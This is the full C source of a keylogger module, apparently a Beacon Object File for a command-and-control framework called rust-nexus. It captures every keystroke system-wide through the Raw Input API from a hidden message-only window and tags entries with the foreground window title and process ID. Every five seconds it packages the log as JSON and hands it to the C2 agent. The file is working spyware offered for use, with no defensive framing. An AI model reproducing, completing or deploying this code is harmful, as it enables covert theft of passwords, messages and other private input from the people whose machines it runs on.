/*
 * Nexus Keylogger BOF - Original Implementation
 * Designed specifically for rust-nexus C2 framework
 * Uses Raw Input API with agent integration
 */

#include <windows.h>
#include <hidusage.h>
#include <stdio.h>

// BOF-specific includes and macros
#pragma comment(lib, "user32.lib")

// Nexus-specific constants
#define NEXUS_KEYLOG_BUFFER_SIZE    8192
#define NEXUS_MAX_WINDOW_TITLE      256
#define NEXUS_KEYLOG_CLASS_NAME     L"NexusKL"
#define NEXUS_CALLBACK_INTERVAL     5000  // 5 seconds in milliseconds

// Data collection structures
typedef struct {
    WCHAR window_title[NEXUS_MAX_WINDOW_TITLE];
    DWORD process_id;
    SYSTEMTIME timestamp;
    WCHAR keystroke_data[NEXUS_KEYLOG_BUFFER_SIZE];
    DWORD data_length;
} NEXUS_KEYLOG_ENTRY;

typedef struct {
    NEXUS_KEYLOG_ENTRY entries[64];  // Circular buffer
    DWORD head;
    DWORD tail;
    DWORD count;
    CRITICAL_SECTION lock;
    BOOL active;
    HWND window_handle;
    HANDLE timer_handle;
} NEXUS_KEYLOGGER_STATE;

// Global state (BOF-safe)
static NEXUS_KEYLOGGER_STATE g_keylogger = {0};
static WCHAR g_current_title[NEXUS_MAX_WINDOW_TITLE] = {0};

// Forward declarations
LRESULT CALLBACK NexusWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
VOID CALLBACK NexusTimerProc(HWND hwnd, UINT msg, UINT_PTR timer_id, DWORD time);
BOOL NexusInitializeKeylogger(VOID);
VOID NexusCleanupKeylogger(VOID);
VOID NexusProcessKey(UINT vkey);
VOID NexusUpdateWindowContext(VOID);
VOID NexusAddKeystrokeEntry(LPCWSTR keystroke);
VOID NexusFlushDataToAgent(VOID);
BOOL NexusRegisterRawInput(HWND hwnd);

// BOF callback function pointer (provided by agent)
typedef VOID (*NEXUS_DATA_CALLBACK)(LPCSTR data, DWORD length);
static NEXUS_DATA_CALLBACK g_callback = NULL;

// BOF Entry Points
__declspec(dllexport) DWORD go(char* args, int length);
__declspec(dllexport) DWORD keylogger_start(char* args, int length);
__declspec(dllexport) DWORD keylogger_stop(char* args, int length);
__declspec(dllexport) DWORD keylogger_status(char* args, int length);
__declspec(dllexport) DWORD keylogger_flush(char* args, int length);

// Main BOF entry point
DWORD go(char* args, int length) {
    if (length < sizeof(NEXUS_DATA_CALLBACK)) {
        return 1; // Invalid arguments
    }
    
    // Extract callback function pointer from arguments
    g_callback = *((NEXUS_DATA_CALLBACK*)args);
    
    if (!g_callback) {
        return 2; // No callback provided
    }
    
    return keylogger_start(args + sizeof(NEXUS_DATA_CALLBACK), 
                          length - sizeof(NEXUS_DATA_CALLBACK));
}

// Start keylogger
DWORD keylogger_start(char* args, int length) {
    if (g_keylogger.active) {
        return 0; // Already running
    }
    
    if (!NexusInitializeKeylogger()) {
        return 3; // Initialization failed
    }
    
    g_keylogger.active = TRUE;
    
    // Send status to agent
    if (g_callback) {
        const char* status = "{\"status\":\"started\",\"type\":\"keylogger_status\"}";
        g_callback(status, (DWORD)strlen(status));
    }
    
    return 0; // Success
}

// Stop keylogger
DWORD keylogger_stop(char* args, int length) {
    if (!g_keylogger.active) {
        return 0; // Already stopped
    }
    
    // Flush any remaining data
    NexusFlushDataToAgent();
    
    NexusCleanupKeylogger();
    g_keylogger.active = FALSE;
    
    // Send status to agent
    if (g_callback) {
        const char* status = "{\"status\":\"stopped\",\"type\":\"keylogger_status\"}";
        g_callback(status, (DWORD)strlen(status));
    }
    
    return 0; // Success
}

// Get keylogger status
DWORD keylogger_status(char* args, int length) {
    char status_buffer[512];
    
    sprintf_s(status_buffer, sizeof(status_buffer),
        "{\"status\":\"%s\",\"type\":\"keylogger_status\",\"buffer_count\":%lu,\"current_window\":\"%ws\"}",
        g_keylogger.active ? "active" : "inactive",
        g_keylogger.count,
        g_current_title
    );
    
    if (g_callback) {
        g_callback(status_buffer, (DWORD)strlen(status_buffer));
    }
    
    return 0;
}

// Flush collected data
DWORD keylogger_flush(char* args, int length) {
    if (g_keylogger.active) {
        NexusFlushDataToAgent();
    }
    return 0;
}

// Initialize keylogger components
BOOL NexusInitializeKeylogger(VOID) {
    WNDCLASSEXW wc = {0};
    
    // Initialize critical section
    InitializeCriticalSection(&g_keylogger.lock);
    
    // Register window class
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = NexusWndProc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = NEXUS_KEYLOG_CLASS_NAME;
    
    if (!RegisterClassExW(&wc)) {
        DeleteCriticalSection(&g_keylogger.lock);
        return FALSE;
    }
    
    // Create message-only window
    g_keylogger.window_handle = CreateWindowExW(
        0,
        NEXUS_KEYLOG_CLASS_NAME,
        NULL,
        0,
        0, 0, 0, 0,
        HWND_MESSAGE,
        NULL,
        GetModuleHandleW(NULL),
        NULL
    );
    
    if (!g_keylogger.window_handle) {
        UnregisterClassW(NEXUS_KEYLOG_CLASS_NAME, GetModuleHandleW(NULL));
        DeleteCriticalSection(&g_keylogger.lock);
        return FALSE;
    }
    
    // Register for raw input
    if (!NexusRegisterRawInput(g_keylogger.window_handle)) {
        DestroyWindow(g_keylogger.window_handle);
        UnregisterClassW(NEXUS_KEYLOG_CLASS_NAME, GetModuleHandleW(NULL));
        DeleteCriticalSection(&g_keylogger.lock);
        return FALSE;
    }
    
    // Set up timer for periodic data flushing
    g_keylogger.timer_handle = (HANDLE)SetTimer(
        g_keylogger.window_handle,
        1,
        NEXUS_CALLBACK_INTERVAL,
        NexusTimerProc
    );
    
    return TRUE;
}

// Cleanup keylogger resources
VOID NexusCleanupKeylogger(VOID) {
    if (g_keylogger.timer_handle) {
        KillTimer(g_keylogger.window_handle, 1);
        g_keylogger.timer_handle = NULL;
    }
    
    if (g_keylogger.window_handle) {
        DestroyWindow(g_keylogger.window_handle);
        g_keylogger.window_handle = NULL;
    }
    
    UnregisterClassW(NEXUS_KEYLOG_CLASS_NAME, GetModuleHandleW(NULL));
    DeleteCriticalSection(&g_keylogger.lock);
    
    // Clear state
    ZeroMemory(&g_keylogger, sizeof(g_keylogger));
}

// Register for raw keyboard input
BOOL NexusRegisterRawInput(HWND hwnd) {
    RAWINPUTDEVICE rid = {0};
    
    rid.usUsagePage = HID_USAGE_PAGE_GENERIC;
    rid.usUsage = HID_USAGE_GENERIC_KEYBOARD;
    rid.dwFlags = RIDEV_INPUTSINK | RIDEV_NOLEGACY;
    rid.hwndTarget = hwnd;
    
    return RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));
}

// Window procedure for raw input handling
LRESULT CALLBACK NexusWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_INPUT: {
            UINT size;
            PRAWINPUT raw_input;
            
            // Get raw input data size
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
            
            raw_input = (PRAWINPUT)HeapAlloc(GetProcessHeap(), 0, size);
            if (!raw_input) break;
            
            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, raw_input, &size, sizeof(RAWINPUTHEADER)) == size) {
                if (raw_input->header.dwType == RIM_TYPEKEYBOARD) {
                    if (raw_input->data.keyboard.Message == WM_KEYDOWN) {
                        NexusProcessKey(raw_input->data.keyboard.VKey);
                    }
                }
            }
            
            HeapFree(GetProcessHeap(), 0, raw_input);
            break;
        }
        
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    
    return 0;
}

// Timer callback for periodic data flushing
VOID CALLBACK NexusTimerProc(HWND hwnd, UINT msg, UINT_PTR timer_id, DWORD time) {
    if (g_keylogger.active && g_keylogger.count > 0) {
        NexusFlushDataToAgent();
    }
}

// Process individual keystrokes
VOID NexusProcessKey(UINT vkey) {
    WCHAR key_buffer[64] = {0};
    BYTE keyboard_state[256];
    WCHAR unicode_char[8] = {0};
    
    // Update window context
    NexusUpdateWindowContext();
    
    // Get keyboard state for proper character translation
    GetKeyState(0);
    GetKeyboardState(keyboard_state);
    
    // Translate virtual key to Unicode
    switch (vkey) {
        case VK_BACK:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[BACKSPACE]");
            break;
        case VK_TAB:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[TAB]");
            break;
        case VK_RETURN:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[ENTER]");
            break;
        case VK_SHIFT:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[SHIFT]");
            break;
        case VK_CONTROL:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[CTRL]");
            break;
        case VK_MENU:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[ALT]");
            break;
        case VK_ESCAPE:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[ESC]");
            break;
        case VK_SPACE:
            wcscpy_s(key_buffer, _countof(key_buffer), L" ");
            break;
        case VK_DELETE:
            wcscpy_s(key_buffer, _countof(key_buffer), L"[DELETE]");
            break;
        default:
            if (ToUnicode(vkey, MapVirtualKeyW(vkey, MAPVK_VK_TO_VSC), 
                         keyboard_state, unicode_char, _countof(unicode_char), 0) > 0) {
                wcscpy_s(key_buffer, _countof(key_buffer), unicode_char);
            } else {
                swprintf_s(key_buffer, _countof(key_buffer), L"[VK_%02X]", vkey);
            }
            break;
    }
    
    // Add to buffer
    NexusAddKeystrokeEntry(key_buffer);
}

// Update current window context
VOID NexusUpdateWindowContext(VOID) {
    HWND foreground_window;
    WCHAR window_title[NEXUS_MAX_WINDOW_TITLE] = {0};
    DWORD process_id = 0;
    
    foreground_window = GetForegroundWindow();
    if (!foreground_window) return;
    
    GetWindowThreadProcessId(foreground_window, &process_id);
    
    if (!GetWindowTextW(foreground_window, window_title, NEXUS_MAX_WINDOW_TITLE)) {
        wcscpy_s(window_title, NEXUS_MAX_WINDOW_TITLE, L"(No Title)");
    }
    
    // Check if window title changed
    if (wcscmp(g_current_title, window_title) != 0) {
        wcscpy_s(g_current_title, NEXUS_MAX_WINDOW_TITLE, window_title);
        
        // Add window change entry
        WCHAR context_entry[NEXUS_KEYLOG_BUFFER_SIZE];
        swprintf_s(context_entry, _countof(context_entry), 
                   L"\n\n[WINDOW: PID:%lu] %s\n", process_id, window_title);
        
        NexusAddKeystrokeEntry(context_entry);
    }
}

// Add keystroke entry to circular buffer
VOID NexusAddKeystrokeEntry(LPCWSTR keystroke) {
    EnterCriticalSection(&g_keylogger.lock);
    
    NEXUS_KEYLOG_ENTRY* entry = &g_keylogger.entries[g_keylogger.tail];
    
    // Initialize entry
    ZeroMemory(entry, sizeof(NEXUS_KEYLOG_ENTRY));
    GetSystemTime(&entry->timestamp);
    wcscpy_s(entry->window_title, _countof(entry->window_title), g_current_title);
    GetWindowThreadProcessId(GetForegroundWindow(), &entry->process_id);
    wcscpy_s(entry->keystroke_data, _countof(entry->keystroke_data), keystroke);
    entry->data_length = (DWORD)wcslen(keystroke) * sizeof(WCHAR);
    
    // Update circular buffer pointers
    g_keylogger.tail = (g_keylogger.tail + 1) % _countof(g_keylogger.entries);
    
    if (g_keylogger.count < _countof(g_keylogger.entries)) {
        g_keylogger.count++;
    } else {
        g_keylogger.head = (g_keylogger.head + 1) % _countof(g_keylogger.entries);
    }
    
    LeaveCriticalSection(&g_keylogger.lock);
}

// Flush collected data to agent
VOID NexusFlushDataToAgent(VOID) {
    if (!g_callback || g_keylogger.count == 0) return;
    
    EnterCriticalSection(&g_keylogger.lock);
    
    char json_buffer[32768];  // Large buffer for JSON data
    char* json_ptr = json_buffer;
    size_t remaining = sizeof(json_buffer) - 1;
    
    // Start JSON array
    int written = sprintf_s(json_ptr, remaining, 
        "{\"type\":\"keylogger_data\",\"entries\":[");
    json_ptr += written;
    remaining -= written;
    
    // Process entries from head to tail
    DWORD current = g_keylogger.head;
    for (DWORD i = 0; i < g_keylogger.count && remaining > 256; i++) {
        NEXUS_KEYLOG_ENTRY* entry = &g_keylogger.entries[current];
        
        // Convert wide string to UTF-8
        char utf8_keystroke[1024];
        char utf8_title[512];
        WideCharToMultiByte(CP_UTF8, 0, entry->keystroke_data, -1, 
                           utf8_keystroke, sizeof(utf8_keystroke), NULL, NULL);
        WideCharToMultiByte(CP_UTF8, 0, entry->window_title, -1, 
                           utf8_title, sizeof(utf8_title), NULL, NULL);
        
        written = sprintf_s(json_ptr, remaining,
            "%s{\"timestamp\":\"%04d-%02d-%02d %02d:%02d:%02d\","
            "\"pid\":%lu,\"window\":\"%s\",\"data\":\"%s\"}",
            (i > 0) ? "," : "",
            entry->timestamp.wYear, entry->timestamp.wMonth, entry->timestamp.wDay,
            entry->timestamp.wHour, entry->timestamp.wMinute, entry->timestamp.wSecond,
            entry->process_id, utf8_title, utf8_keystroke);
        
        json_ptr += written;
        remaining -= written;
        current = (current + 1) % _countof(g_keylogger.entries);
    }
    
    // End JSON array
    sprintf_s(json_ptr, remaining, "]}");
    
    // Send to agent
    g_callback(json_buffer, (DWORD)strlen(json_buffer));
    
    // Clear buffer
    g_keylogger.count = 0;
    g_keylogger.head = 0;
    g_keylogger.tail = 0;
    
    LeaveCriticalSection(&g_keylogger.lock);
}
